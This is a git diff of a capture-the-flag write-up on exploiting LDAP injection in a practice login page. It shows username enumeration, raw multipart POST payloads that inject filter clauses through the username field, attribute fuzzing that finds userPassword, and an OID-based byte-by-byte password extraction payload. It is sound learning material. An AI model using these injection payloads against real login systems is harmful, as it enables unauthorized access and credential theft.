@@ -22,6 +22,8 @@ Started by navigating to the instance: http://btfryxiw.playat.flagyard.com/login
 
 Ok, better look at source code (`Ctrl + U`):
 
+And we can easily guess that `admin` is a valid username because when we try admin:admin it says `Invalid password`. If we use other username we get `Username not found`.
+
 ```html
 <form id="loginForm">
     <div class="form-group">
@@ -137,32 +139,87 @@ At the begining there is the `&` sign which is like AND operator. It compares tw
 
 The idea is to control username and password inputs to fool it to be TRUE. Lets try the game by setting password to `*` this should always return TRUE. BUT no! Password was sanitized. So we can only control the username.
 
-And we can easily guess that `admin` is a valid username because when we trie admin:admin it said `Invalid password` and not `Username not found`.
+Now, may be we should be able to control the password if we inject it into the username POST parameter?
 
+So I wanna send as `username`: `player1)(password=password123` to get this `(& ( username = player1 ) ( password = password123) (password = password123))`. If it returns `success` then it works and password is injectable as I have correct passwored in both `(...)`! 
 
+Here is POST payload:
+
+```bash
+
+------geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff
+Content-Disposition: form-data; name="username"
+
+player1)(password=password123
+------geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff
+Content-Disposition: form-data; name="password"
+
+test
+------geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff--
+
+```
+
+and I get as response..
+
+```bash
+HTTP/1.1 200 OK
+
+{"message":"Username not found. Please check your username.","success":false}
+```
+
+My injection did not work as it says username not found!!!
+
+Why? Because password is not a correct attribute. It must be something else inside:
+
+```bash
+
+$login = (&(username = $_POST["username"])(UNKNOWN = $_POST["password"]))
+
+```
+
+The goal is finding this `UNKNOWN attribute now`. We take it and put into Burp intruder since I did not want to mess with creation of boundary POSTS (but had to d oit later anyway...):
+
+```
+------geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff
+Content-Disposition: form-data; name="username"
+
+player1)(&FUZZ&=password123
+------geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff
+Content-Disposition: form-data; name="password"
+
+password123
+------geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff--
+
+```
+
+As dictionary I used one of the Seclists. And bingo I got `{"message":"Login successful!","redirect":"/dashboard","success":true}` while using `userPassword`.
+
+So my payload should be something like `admin)(userPassword=` for attacking the admin creds.
+
+I tried `admin)(userPassword=*` but I get `Username not found`. This is because `*` is probably filtered. Other symbols cant help me.
 
 ## Foothold
+
+After spending some hour digging, I found on `https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/` some interesting thing.
+
+```text
+Exploiting userPassword Attribute
+
+userPassword attribute is not a string like the cn attribute for example but it’s an OCTET STRING In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
+
+octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.
+
+userPassword:2.5.13.18:=\xx (\xx is a byte)
+userPassword:2.5.13.18:=\xx\xx
+userPassword:2.5.13.18:=\xx\xx\xx
+```
+Well it was hot obvious to me at all. So I tried manual approach to it.
+
+
 
 ## Exploitation
 
 
-Вот теперь понятно что мы имеем дело с LDAP аутентификацией
-
-находим валидный аттрибут
-
-userPassword
-objectClass
-commonName
-surname
-name
-cn
-sn
-
-подтверждаем
-
-player1)(&FUZZ&=*)
-
-userPassword валиден, значит это наш аттрибут пароля и мы можем его контролировать!
 
 
 player1)(userPassword:2.5.13.18:=\70\62
